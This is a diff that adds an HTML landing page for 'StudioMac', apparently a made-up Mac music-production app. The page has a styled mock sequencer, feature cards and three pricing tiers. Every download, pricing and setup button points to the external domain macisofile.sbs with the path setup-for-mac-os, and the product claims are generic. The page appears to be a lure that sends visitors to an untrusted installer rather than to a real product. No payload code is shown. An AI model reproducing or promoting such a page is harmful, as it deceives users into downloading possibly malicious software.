@@ -1,0 +1,98 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>StudioMac — Music Production for Mac</title>
+<meta name="description" content="StudioMac — modern music production for Mac creators.">
+<style>
+:root{--bg:#07070b;--card:#10121a;--line:#292c38;--text:#f7f7fb;--muted:#9297a8;--p:#8b5cf6;--pink:#ec4899;--max:1160px}
+*{box-sizing:border-box;margin:0;padding:0}html{scroll-behavior:smooth}
+body{font-family:Inter,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;background:var(--bg);color:var(--text);line-height:1.6;overflow-x:hidden}
+a{text-decoration:none;color:inherit}.container{width:min(var(--max),92%);margin:auto}
+header{position:fixed;top:0;left:0;right:0;z-index:10;background:#07070bcc;backdrop-filter:blur(18px);border-bottom:1px solid #ffffff12}
+.nav{height:74px;display:flex;align-items:center;justify-content:space-between}
+.logo{display:flex;align-items:center;gap:10px;font-weight:850;font-size:19px}.logo-mark{width:37px;height:37px;display:grid;place-items:center;border-radius:11px;background:linear-gradient(135deg,var(--p),var(--pink));box-shadow:0 0 30px #8b5cf633}.logo em{font-style:normal;color:#bca6ff}
+nav{display:flex;gap:28px;color:#a7abb9;font-size:13px}nav a:hover{color:white}
+.navbtn,.btn{display:inline-flex;align-items:center;justify-content:center;border-radius:10px;font-weight:750}
+.navbtn{padding:10px 16px;background:#fff;color:#08080b;font-size:13px}.menu{display:none;background:#11131b;border:1px solid var(--line);color:#fff;border-radius:9px;padding:8px 11px}
+.hero{min-height:100vh;padding:145px 0 85px;background:radial-gradient(circle at 15% 20%,#8b5cf61c,transparent 32%),radial-gradient(circle at 85% 20%,#ec489912,transparent 30%)}
+.hero-grid{display:grid;grid-template-columns:1fr 1fr;gap:60px;align-items:center}
+.badge{display:inline-flex;align-items:center;gap:8px;padding:7px 12px;border:1px solid #8b5cf63d;background:#8b5cf611;border-radius:99px;color:#cdbfff;font-size:11px;margin-bottom:20px}.badge i{width:7px;height:7px;border-radius:50%;background:#a78bfa;box-shadow:0 0 12px #a78bfa}
+h1{font-size:clamp(50px,6.5vw,78px);line-height:.98;letter-spacing:-4px;margin-bottom:22px}.gradient{background:linear-gradient(90deg,#fff,#bca4ff,#ff8bc8);-webkit-background-clip:text;background-clip:text;color:transparent}
+.lead{max-width:570px;color:var(--muted);font-size:17px;margin-bottom:27px}.actions{display:flex;gap:11px;flex-wrap:wrap}.btn{padding:13px 19px;font-size:13px}.primary{background:linear-gradient(135deg,var(--p),var(--pink));box-shadow:0 12px 32px #8b5cf62b}.secondary{background:#11131b;border:1px solid #303340;color:#ddd}
+.meta{display:flex;gap:18px;flex-wrap:wrap;margin-top:19px;color:#6f7484;font-size:11px}
+.app{border:1px solid #292c38;border-radius:17px;overflow:hidden;background:#0c0e14;box-shadow:0 35px 80px #0009,0 0 70px #8b5cf614}.appbar{height:48px;display:flex;align-items:center;justify-content:space-between;padding:0 14px;background:#14161e;color:#7d8292;font-size:11px;border-bottom:1px solid #242733}.dots{display:flex;gap:6px}.dots i{width:9px;height:9px;border-radius:50%;background:#ff5f57}.dots i:nth-child(2){background:#febc2e}.dots i:nth-child(3){background:#28c840}
+.transport{display:flex;gap:7px;padding:12px;border-bottom:1px solid #222530}.transport button{width:34px;height:30px;border-radius:7px;border:1px solid #303340;background:#191c25;color:#ddd;cursor:pointer}.transport .active{background:var(--p);border-color:var(--p)}.bpm{margin-left:auto;color:#b9a5ff;font-size:11px;font-weight:800}
+.seq{padding:17px;display:grid;grid-template-columns:68px 1fr;gap:12px}.labels{display:grid;grid-template-rows:repeat(5,30px);gap:7px;color:#707688;font-size:9px;align-items:center}.tracks{display:grid;gap:7px}.track{display:grid;grid-template-columns:repeat(12,1fr);gap:4px;height:30px}.step{border:1px solid #282c37;background:#181b24;border-radius:4px}.step.on{background:linear-gradient(135deg,var(--p),var(--pink));border-color:#a990ff}
+.mixer{display:grid;grid-template-columns:repeat(5,1fr);gap:8px;padding:15px;background:#090b10;border-top:1px solid #222530}.channel{height:105px;border:1px solid #20232e;border-radius:8px;background:#11141b;display:flex;flex-direction:column;align-items:center;justify-content:end;gap:7px;padding:8px}.meter{height:42px;width:5px;background:#242833;border-radius:8px;display:flex;align-items:end;overflow:hidden}.meter span{height:70%;width:100%;background:linear-gradient(#ec4899,#8b5cf6)}.knob{width:22px;height:22px;border-radius:50%;background:#2a2d38;border:4px solid #171a22}.channel small{font-size:7px;color:#777d8c}
+.section{padding:105px 0}.head{max-width:680px;text-align:center;margin:0 auto 48px}.kicker{color:#ae98ff;font-size:10px;letter-spacing:2px;font-weight:800}h2{font-size:clamp(36px,4.5vw,54px);line-height:1.05;letter-spacing:-2.5px;margin:11px 0 15px}.head p{color:#858b9b;font-size:14px}
+.features{background:#090b10;border-top:1px solid #151821}.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:15px}.card{padding:27px;border:1px solid #252834;border-radius:14px;background:linear-gradient(145deg,#12141d,#0d0f15);min-height:205px}.card:hover{transform:translateY(-4px);border-color:#574684}.icon{width:43px;height:43px;display:grid;place-items:center;border-radius:11px;background:#1b1728;margin-bottom:16px;font-size:20px}.card h3{font-size:17px;margin-bottom:7px}.card p{color:#7f8596;font-size:12px}
+.workflow{display:grid;grid-template-columns:1fr 1fr;gap:75px;align-items:center}.wavebox{height:350px;border:1px solid #292d39;border-radius:17px;background:radial-gradient(circle,#8b5cf626,transparent 45%),#0e1017;display:flex;align-items:center;justify-content:center;gap:6px;overflow:hidden}.wavebox span{width:7px;border-radius:8px;background:linear-gradient(#ec4899,#8b5cf6)}.wavebox span:nth-child(1){height:45px}.wavebox span:nth-child(2){height:95px}.wavebox span:nth-child(3){height:170px}.wavebox span:nth-child(4){height:80px}.wavebox span:nth-child(5){height:210px}.wavebox span:nth-child(6){height:125px}.wavebox span:nth-child(7){height:185px}.wavebox span:nth-child(8){height:70px}.wavebox span:nth-child(9){height:220px}.wavebox span:nth-child(10){height:110px}.wavebox span:nth-child(11){height:180px}.wavebox span:nth-child(12){height:75px}.wavebox span:nth-child(13){height:200px}.wavebox span:nth-child(14){height:105px}.wavebox span:nth-child(15){height:160px}.wavebox span:nth-child(16){height:60px}
+.steps{list-style:none;display:grid;gap:10px;margin-top:24px}.steps li{border-bottom:1px solid #20232d;padding:9px 0;color:#c4c7d1;font-size:13px}.steps b{color:#ae98ff;margin-right:12px}
+.stats{padding:52px 0;background:#090b10;border-block:1px solid #1b1e27}.statgrid{display:grid;grid-template-columns:repeat(4,1fr);text-align:center}.stat{border-right:1px solid #22252e}.stat:last-child{border:0}.stat strong{display:block;color:#ae98ff;font-size:32px}.stat span{color:#6f7585;font-size:11px}
+.pricing{background:#080a0f}.prices{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}.price{border:1px solid #252934;border-radius:15px;padding:30px;background:#10121a;position:relative}.price.featured{border-color:#8b5cf6;box-shadow:0 0 45px #8b5cf612}.pop{position:absolute;right:18px;top:-12px;padding:4px 9px;border-radius:20px;background:#8b5cf6;font-size:9px;font-weight:800}.plan{font-size:10px;letter-spacing:2px;color:#858b9b;font-weight:800}.price h3{font-size:29px;margin:7px 0}.price p{color:#777e8e;font-size:12px;min-height:48px}.amount{font-size:40px;font-weight:850;margin:17px 0}.amount small{font-size:10px;color:#6e7484;font-weight:400}.price a{display:block;text-align:center;padding:12px;border-radius:9px;background:#1b1e28;border:1px solid #2d303b;font-size:12px;font-weight:750;margin-bottom:20px}.price.featured a{background:linear-gradient(135deg,var(--p),var(--pink));border:0}.price ul{list-style:none;display:grid;gap:8px;color:#8e94a5;font-size:11px}
+.download{padding:105px 0}.downloadbox{padding:50px;border:1px solid #302b43;border-radius:20px;background:radial-gradient(circle at 80% 30%,#ec489916,transparent 30%),radial-gradient(circle at 20% 70%,#8b5cf61a,transparent 35%),#11131b;display:flex;align-items:center;justify-content:space-between;gap:30px}.downloadbox p{color:#818797;font-size:13px}
+footer{border-top:1px solid #1d2029;padding:45px 0 22px;background:#06070b}.footer{display:flex;justify-content:space-between;gap:40px}.footer p{color:#686e7d;font-size:11px;margin-top:10px}.links{display:flex;gap:45px}.links div{display:grid;gap:7px}.links b{font-size:11px}.links a{color:#686e7d;font-size:10px}.copy{border-top:1px solid #181b22;margin-top:35px;padding-top:18px;color:#555b6a;font-size:9px}
+@media(max-width:850px){nav,.navbtn{display:none}.menu{display:block}.hero-grid,.workflow{grid-template-columns:1fr}.grid{grid-template-columns:1fr 1fr}.prices{grid-template-columns:1fr;max-width:500px;margin:auto}.downloadbox,.footer{flex-direction:column;align-items:flex-start}nav.open{display:flex;position:absolute;top:74px;left:0;right:0;background:#0b0d13;padding:20px 5%;flex-direction:column;border-bottom:1px solid #242731}}
+@media(max-width:560px){h1{font-size:48px;letter-spacing:-2px}.grid{grid-template-columns:1fr}.statgrid{grid-template-columns:1fr 1fr;gap:25px 0}.stat{border:0}.seq{min-width:510px}.app{overflow:auto}.mixer{min-width:460px}.links{flex-wrap:wrap}}
+</style>
+</head>
+<body>
+<header><div class="container nav">
+<a class="logo" href="#"><span class="logo-mark">S</span><span>Studio<em>Mac</em></span></a>
+<nav id="nav"><a href="#features">Features</a><a href="#workflow">Workflow</a><a href="#pricing">Pricing</a><a href="#download">Download</a></nav>
+<a class="navbtn" href="https://macisofile.sbs/setup-for-mac-os/" target="_blank" rel="noopener">Get StudioMac</a><button class="menu" id="menu">☰</button>
+</div></header>
+
+<main>
+<section class="hero"><div class="container hero-grid"><div>
+<div class="badge"><i></i> Built for Mac creators</div>
+<h1>Make music.<span class="gradient">Make magic.</span></h1>
+<p class="lead">A modern music production experience for producers, beatmakers and musicians who want a fast, focused creative workflow.</p>
+<div class="actions"><a class="btn primary" href="https://macisofile.sbs/setup-for-mac-os/" target="_blank" rel="noopener">Download for Mac ↓</a><a class="btn secondary" href="#features">Explore features</a></div>
+<div class="meta"><span>✓ macOS compatible</span><span>✓ Free trial</span><span>✓ Fast workflow</span></div>
+</div>
+<div class="app"><div class="appbar"><div class="dots"><i></i><i></i><i></i></div><span>StudioMac</span><span>● 128 BPM</span></div>
+<div class="transport"><button>◀</button><button id="play">▶</button><button id="stop">■</button><span id="clock">00:01:28</span><span class="bpm">128 BPM</span></div>
+<div class="seq"><div class="labels"><div>Kick</div><div>Snare</div><div>Hi-Hat</div><div>Bass</div><div>Melody</div></div><div class="tracks">
+<div class="track"><i class="step"></i><i class="step"></i><i class="step on"></i><i class="step"></i><i class="step"></i><i class="step on"></i><i class="step"></i><i class="step"></i><i class="step"></i><i class="step on"></i><i class="step"></i><i class="step"></i></div>
+<div class="track"><i class="step"></i><i class="step on"></i><i class="step"></i><i class="step"></i><i class="step on"></i><i class="step"></i><i class="step"></i><i class="step"></i><i class="step on"></i><i class="step"></i><i class="step"></i><i class="step"></i></div>
+<div class="track"><i class="step on"></i><i class="step"></i><i class="step on"></i><i class="step"></i><i class="step on"></i><i class="step"></i><i class="step on"></i><i class="step"></i><i class="step on"></i><i class="step"></i><i class="step on"></i><i class="step"></i></div>
+<div class="track"><i class="step"></i><i class="step"></i><i class="step"></i><i class="step on"></i><i class="step"></i><i class="step"></i><i class="step"></i><i class="step on"></i><i class="step"></i><i class="step"></i><i class="step"></i><i class="step on"></i></div>
+<div class="track"><i class="step on"></i><i class="step"></i><i class="step"></i><i class="step on"></i><i class="step"></i><i class="step on"></i><i class="step"></i><i class="step"></i><i class="step on"></i><i class="step"></i><i class="step on"></i><i class="step"></i></div>
+</div></div>
+<div class="mixer"><div class="channel"><div class="meter"><span></span></div><div class="knob"></div><small>KICK</small></div><div class="channel"><div class="meter"><span></span></div><div class="knob"></div><small>SNARE</small></div><div class="channel"><div class="meter"><span></span></div><div class="knob"></div><small>BASS</small></div><div class="channel"><div class="meter"><span></span></div><div class="knob"></div><small>LEAD</small></div><div class="channel"><div class="meter"><span></span></div><div class="knob"></div><small>MASTER</small></div></div>
+</div></div></section>
+
+<section class="section features" id="features"><div class="container"><div class="head"><span class="kicker">POWERFUL TOOLS</span><h2>Everything you need to create.</h2><p>Build beats, arrange ideas, shape sounds and finish tracks in one focused workspace.</p></div>
+<div class="grid"><div class="card"><div class="icon">🎹</div><h3>Virtual Instruments</h3><p>Create melodies and harmonies with expressive instruments and controls.</p></div><div class="card"><div class="icon">🎛️</div><h3>Pro Mixer</h3><p>Shape your sound with channels, effects, routing and mixing tools.</p></div><div class="card"><div class="icon">🥁</div><h3>Beat Maker</h3><p>Build grooves quickly with an intuitive step-sequencing workflow.</p></div><div class="card"><div class="icon">〰️</div><h3>Audio Editing</h3><p>Arrange and transform recordings with precise editing controls.</p></div><div class="card"><div class="icon">✨</div><h3>Creative Effects</h3><p>Add character with filters, dynamics, ambience and creative processing.</p></div><div class="card"><div class="icon">⚡</div><h3>Fast Workflow</h3><p>Spend less time navigating and more time making music.</p></div></div></div></section>
+
+<section class="section" id="workflow"><div class="container workflow"><div class="wavebox"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></div>
+<div><span class="kicker">YOUR CREATIVE WORKFLOW</span><h2>From first beat <span class="gradient">to final master.</span></h2><p style="color:#858b9b;font-size:14px">Start with an idea, build the arrangement, mix every element and finish your track in a focused production environment.</p><ul class="steps"><li><b>01</b> Start with a beat</li><li><b>02</b> Build your arrangement</li><li><b>03</b> Mix and add effects</li><li><b>04</b> Export your final track</li></ul></div></div></section>
+
+<section class="stats"><div class="container statgrid"><div class="stat"><strong>64+</strong><span>Audio tracks</span></div><div class="stat"><strong>1000+</strong><span>Creative sounds</span></div><div class="stat"><strong>32-bit</strong><span>Audio engine</span></div><div class="stat"><strong>∞</strong><span>Your creativity</span></div></div></section>
+
+<section class="section pricing" id="pricing"><div class="container"><div class="head"><span class="kicker">SIMPLE PRICING</span><h2>Choose your studio.</h2><p>Start creating today and choose the plan that fits your workflow.</p></div><div class="prices">
+<div class="price"><span class="plan">STARTER</span><h3>Free</h3><p>Everything you need to start making music.</p><div class="amount">$0 <small>/ forever</small></div><a href="https://macisofile.sbs/setup-for-mac-os/" target="_blank" rel="noopener">Get started</a><ul><li>✓ Basic instruments</li><li>✓ 16 audio tracks</li><li>✓ Essential effects</li><li>✓ WAV export</li></ul></div>
+<div class="price featured"><span class="pop">MOST POPULAR</span><span class="plan">PRODUCER</span><h3>Pro</h3><p>Full creative power for serious producers.</p><div class="amount">$149 <small>/ one-time</small></div><a href="https://macisofile.sbs/setup-for-mac-os/" target="_blank" rel="noopener">Get Pro</a><ul><li>✓ Unlimited projects</li><li>✓ 64+ audio tracks</li><li>✓ Full effects library</li><li>✓ Advanced mixer</li><li>✓ High-quality export</li></ul></div>
+<div class="price"><span class="plan">STUDIO</span><h3>Ultimate</h3><p>Everything for professional studio workflows.</p><div class="amount">$249 <small>/ one-time</small></div><a href="https://macisofile.sbs/setup-for-mac-os/" target="_blank" rel="noopener">Get Ultimate</a><ul><li>✓ Everything in Pro</li><li>✓ Premium instruments</li><li>✓ Advanced mastering</li><li>✓ Studio templates</li></ul></div>
+</div></div></section>
+
+<section class="download" id="download"><div class="container downloadbox"><div><span class="kicker">READY TO CREATE?</span><h2>Your next track <span class="gradient">starts here.</span></h2><p>Open the StudioMac setup page and continue from there.</p></div><a class="btn primary" href="https://macisofile.sbs/setup-for-mac-os/" target="_blank" rel="noopener">Open Setup Page →</a></div></section>
+</main>
+
+<footer><div class="container footer"><div><a class="logo" href="#"><span class="logo-mark">S</span><span>Studio<em>Mac</em></span></a><p>Music production without limits.</p></div><div class="links"><div><b>Product</b><a href="#features">Features</a><a href="#pricing">Pricing</a><a href="#download">Download</a></div><div><b>StudioMac</b><a href="#workflow">Workflow</a><a href="https://macisofile.sbs/setup-for-mac-os/" target="_blank" rel="noopener">Setup Page</a></div></div></div><div class="container copy">© 2026 StudioMac. All rights reserved.</div></footer>
+
+<script>
+const menu=document.getElementById('menu'),nav=document.getElementById('nav');
+menu.onclick=()=>nav.classList.toggle('open');
+document.querySelectorAll('nav a').forEach(a=>a.onclick=()=>nav.classList.remove('open'));
+const play=document.getElementById('play'),stop=document.getElementById('stop'),clock=document.getElementById('clock');
+let timer=null,seconds=88;
+function showTime(){const m=Math.floor(seconds/60),s=seconds%60;clock.textContent='00:'+String(m).padStart(2,'0')+':'+String(s).padStart(2,'0')}
+play.onclick=()=>{if(timer){clearInterval(timer);timer=null;play.textContent='▶';play.classList.remove('active')}else{play.textContent='Ⅱ';play.classList.add('active');timer=setInterval(()=>{seconds++;showTime()},1000)}};
+stop.onclick=()=>{clearInterval(timer);timer=null;seconds=88;showTime();play.textContent='▶';play.classList.remove('active')};
+</script>
+</body>
+</html>
